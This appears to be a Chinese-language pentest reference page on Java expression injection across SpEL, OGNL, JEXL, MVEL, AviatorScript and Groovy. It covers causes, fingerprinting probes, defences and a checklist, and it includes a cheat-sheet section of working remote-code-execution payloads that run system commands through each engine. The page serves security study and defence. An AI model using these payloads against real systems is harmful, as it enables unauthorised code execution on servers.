# Java 表达式注入

## 一句话理解
Java 表达式注入是一个总称，指用户输入进入 OGNL、SpEL、JEXL、MVEL、AviatorScript、Groovy 等表达式或脚本引擎后，被当成可执行表达式解释，从而访问对象、调用方法，甚至实现远程代码执行。

## 常见类型
- SpEL
- OGNL
- JEXL
- MVEL
- AviatorScript
- Groovy 表达式 / 脚本

## 与命令执行的关系
表达式注入不一定一开始就能直接执行系统命令，但它通常是通往 RCE 的前置入口。  
只要表达式能力足够强，或者上下文对象暴露过多，攻击者就可能：
- 访问应用对象
- 调用类和方法
- 执行脚本
- 触发命令执行

## 常见成因
- 把用户输入直接传给表达式引擎
- 在规则引擎、权限判断、模板渲染、动态计算中使用可控表达式
- 后台支持“自定义规则”“自定义公式”“自定义模板”
- 误以为只允许数学表达式，但实际暴露了完整对象上下文

## 常见危害
- 读取配置和运行时对象
- 访问 Bean、Context、Request、Session
- 调用危险类方法
- 命令执行
- 作为进入框架内部对象图的跳板

## 实战排查思路
### 1. 先识别具体引擎
不同引擎语法不同，利用方式差异很大。  
排查重点：
- 依赖包
- 报错信息
- 方法名
- 模板和表达式语法特征

### 2. 再看输入控制点
关键在于：
- 用户能否控制表达式本身
- 用户能否影响表达式上下文

### 3. 再看可达对象
如果能访问：
- Request
- Session
- Spring Context
- BeanFactory
- ClassLoader

风险会明显提高。

## 引擎识别（定界符速查）
拿到可疑输入点后，优先注入不同定界符试探，观察求值结果或报错：

| 定界符 | 对应引擎 / 技术 |
| --- | --- |
| `${...}` | JSP EL、FreeMarker、Velocity、MVEL、JEXL |
| `#{...}` | SpEL（Spring）、OGNL（部分场景）、JSF EL |
| `%{...}` | OGNL（Struts2 特有） |
| `<%= ... %>` | ERB（Ruby）、JSP 脚本片段 |
| `{{...}}` | Jinja2、Twig、Mustache 等现代模板引擎 |

补充识别技巧：
- `${7*7}` 回显 `49` → EL / FreeMarker 类
- `#{7*7}` 回显 `49` → SpEL / OGNL 类
- 一次性探测 polyglot：`${{<%[%'"}}`
- 报错信息中的异常类名（如 `SpelEvaluationException`、`JexlException`）是引擎最直接的指纹

## 各引擎 Payload 速查
SpEL 与 OGNL 的详细利用见对应专篇，以下为其余引擎的常用 RCE 链。

### JSP EL 注入（Tomcat EL 2.2+ / 3.0）
适用场景：EL 求值点可控（自定义标签属性、`ValueExpression` 动态求值等），Tomcat 7+ 的 EL 已支持方法调用：

```text
${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('id')")}
```

注意：该链依赖 Nashorn 等 JavaScript 引擎，高版本 JDK 可能已移除或禁用，需实测。

### Groovy 注入
适用场景：`GroovyShell.evaluate`、`Eval` 系列调用、规则引擎 / 工作流内嵌 Groovy 脚本：

```groovy
"id".execute()                              // 直接执行系统命令
"id".execute().text                         // 执行命令并回显输出
Eval.me('Runtime.getRuntime().exec("id")')  // Eval.me 求值任意 Groovy 代码
```

### JEXL 注入
适用场景：Apache Commons JEXL，常见于规则引擎、日志 / 过滤条件配置化功能：

```text
''.class.forName('java.lang.Runtime').getRuntime().exec('calc')
```

### MVEL 注入
适用场景：MVEL 2.x 表达式引擎，常见于 Drools 规则引擎、JBoss 系组件：

```text
Runtime.getRuntime().exec("calc");
new java.lang.ProcessBuilder({'id'}).start()
```

MVEL 语法接近 Java，`{'id'}` 是列表写法，且允许直接 `new` 对象。

### AviatorScript 注入
适用场景：AviatorScript（Aviator 5.x），国内规则引擎、营销 / 风控系统常用：

```text
use(java.lang.Runtime);Runtime.getRuntime().exec("id")
```

`use` 用于导入类，导入后可直接调用其静态方法。

## 高危场景
- 规则引擎
- 流程引擎
- 权限表达式
- 搜索过滤器
- 报表公式
- 低代码平台
- 模板预览和自定义页面

## 常见绕过思路
- 关键字黑名单绕过
- 字符串拼接绕过
- 借助上下文对象间接访问危险类
- 利用引擎特有语法规避过滤

## 防御要点
### 1. 不执行不可信表达式
这是根本原则。

### 2. 只开放安全子集
若业务必须支持表达式，应限制为固定字段、固定运算、固定函数。

### 3. 限制上下文对象
不要把应用运行时对象直接暴露给表达式环境。

### 4. 不依赖黑名单
表达式注入绕过空间通常很大，黑名单容易失效。

## 速查清单
- 先识别具体引擎，不要把所有表达式问题混在一起
- 先找表达式入口，再看上下文对象
- 看是否能访问类、方法、Bean、运行时对象
- 高优先排查规则引擎、低代码平台、后台动态配置功能
- 一旦可控表达式成立，就继续判断能否升级为 RCE

## Reference
- [Java 表达式注入](https://y4er.com/post/java-expression-injection/)
- [payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)
